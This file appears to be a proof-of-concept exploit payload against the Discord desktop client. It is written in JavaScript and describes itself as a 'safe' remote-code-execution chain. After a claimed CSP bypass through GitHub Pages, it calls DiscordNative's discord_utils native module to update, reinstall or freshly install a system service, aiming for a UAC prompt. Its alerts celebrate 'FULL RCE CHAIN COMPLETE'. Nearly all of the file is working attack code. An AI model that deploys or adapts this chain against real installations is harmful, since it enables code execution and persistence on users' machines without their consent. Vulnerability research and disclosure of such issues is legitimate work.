// SAFE RCE CHAIN - CHECK BEFORE UNINSTALL
// This version checks service status before attempting uninstall

console.log("🔥 DISCORD RCE CHAIN - SAFE VERSION\n");
console.log("=" + "=".repeat(60) + "\n");

// Step 1: Confirm CSP bypass
alert("🎉 CSP BYPASS SUCCESSFUL!\n\nPayload loaded from GitHub Pages");

console.log("[✅] CSP bypassed via GitHub Pages");
console.log("[✅] Arbitrary JavaScript execution achieved\n");

// Step 2: Check DiscordNative availability
if (typeof DiscordNative === 'undefined') {
    console.log("[❌] DiscordNative not available");
    alert("⚠️ Not in Discord context");
} else {
    console.log("[✅] DiscordNative available\n");

    try {
        // Load discord_utils module
        console.log("[*] Loading discord_utils module...");
        const utils = DiscordNative.nativeModules.requireModule('discord_utils');
        console.log("[✅] discord_utils loaded successfully\n");

        // Step 3: Check if service is installed
        console.log("[*] Checking service status...");

        const isInstalled = utils.isSystemServiceInstalled();
        console.log(`[*] Service installed: ${isInstalled}\n`);

        if (isInstalled) {
            // Service exists - try to UPDATE it (might trigger UAC)
            console.log("[STRATEGY 1] Service exists - attempting UPDATE...");
            console.log("[🔥] This might trigger UAC!\n");

            utils.updateSystemService()
                .then(result => {
                    console.log(`[✅] Update result: ${JSON.stringify(result)}`);
                    alert("🔥 SERVICE UPDATE TRIGGERED!\n\nDid UAC prompt appear?");
                })
                .catch(error => {
                    console.log(`[!] Update failed: ${error.message}`);

                    // If update fails, try reinstall
                    console.log("\n[STRATEGY 2] Update failed - trying REINSTALL...");

                    utils.installSystemService()
                        .then(result => {
                            console.log(`[✅] Reinstall result: ${JSON.stringify(result)}`);
                            alert("🔥 SERVICE REINSTALLED!\n\nDid UAC prompt appear?");
                        })
                        .catch(error2 => {
                            console.log(`[!] Reinstall also failed: ${error2.message}`);
                        });
                });

        } else {
            // Service doesn't exist - fresh install (will trigger UAC)
            console.log("[STRATEGY 3] Service not installed - fresh INSTALL...");
            console.log("[🔥] UAC PROMPT SHOULD APPEAR!\n");

            utils.installSystemService()
                .then(result => {
                    console.log(`[🎉] SUCCESS! Service installed: ${JSON.stringify(result)}`);

                    alert("🔥 FULL RCE CHAIN COMPLETE!\n\n" +
                        "1. CSP Bypass ✅\n" +
                        "2. Remote Code Execution ✅\n" +
                        "3. Service Installed ✅\n" +
                        "4. UAC Prompt Triggered ✅\n\n" +
                        "CRITICAL SEVERITY EXPLOIT!");
                })
                .catch(error => {
                    console.log(`[!] Install failed: ${error.message}`);
                    alert(`Install failed: ${error.message}`);
                });
        }

    } catch (e) {
        console.log(`[❌] Error: ${e.message}`);
        alert(`Error: ${e.message}`);
    }
}

console.log("\n" + "=" + "=".repeat(60));
console.log("PAYLOAD EXECUTION COMPLETE");
console.log("=" + "=".repeat(60));
